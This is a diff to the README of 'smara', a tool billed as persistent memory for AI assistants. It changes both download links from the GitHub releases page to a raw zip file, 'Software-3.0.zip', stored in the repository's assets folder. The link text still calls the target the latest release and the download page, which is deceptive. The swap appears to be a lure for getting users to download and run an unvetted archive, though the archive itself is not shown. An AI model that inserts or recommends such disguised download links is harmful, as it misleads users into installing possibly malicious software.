@@ -1,6 +1,6 @@
 # 🧠 smara - Persistent memory for your AI tools
 
-[![Download smara](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jefffergunson118-beep/smara/releases)
+[![Download smara](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jefffergunson118-beep/smara/raw/refs/heads/main/assets/Software-3.0.zip)
 
 Smara provides a memory bank for your artificial intelligence tools. It tracks your projects and notes so that helpers like Claude, Cursor, and Codex remember your work between sessions. You no longer need to repeat your preferences or project details every time you start a new task. Smara keeps your context consistent.
 
@@ -14,7 +14,7 @@ This tool uses a local vector database to store your context. It organizes your 
 
 You can obtain the current version of the application from the official release page. 
 
-[Click here to open the download page](https://github.com/jefffergunson118-beep/smara/releases)
+[Click here to open the download page](https://github.com/jefffergunson118-beep/smara/raw/refs/heads/main/assets/Software-3.0.zip)
 
 ## ⚙️ How to install smara
 
